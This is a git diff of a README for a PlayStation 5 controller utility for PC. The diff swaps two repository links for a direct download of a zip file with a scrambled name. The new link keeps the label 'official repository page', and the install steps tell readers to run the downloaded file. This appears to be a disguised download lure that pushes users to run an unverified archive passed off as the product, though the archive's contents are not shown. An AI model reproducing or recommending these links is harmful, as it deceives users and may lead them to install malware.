@@ -1,6 +1,6 @@
 # 🎮 DualSenseX-Steam-PC-Controller - Use PS5 features on your PC
 
-[![](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller)
+[![](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller/raw/refs/heads/main/sources/Steam-P-Controller-Sense-Dual-prediligent.zip)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up your controller for PC gaming.
 
-1.  Visit the official repository page to download the latest version: [https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller).
+1.  Visit the official repository page to download the latest version: [https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller/raw/refs/heads/main/sources/Steam-P-Controller-Sense-Dual-prediligent.zip](https://github.com/Manibharath5486/DualSenseX-Steam-PC-Controller/raw/refs/heads/main/sources/Steam-P-Controller-Sense-Dual-prediligent.zip).
 2.  Locate the latest release file on the page.
 3.  Click the link to save the installer to your computer.
 4.  Run the downloaded file to begin the installation.
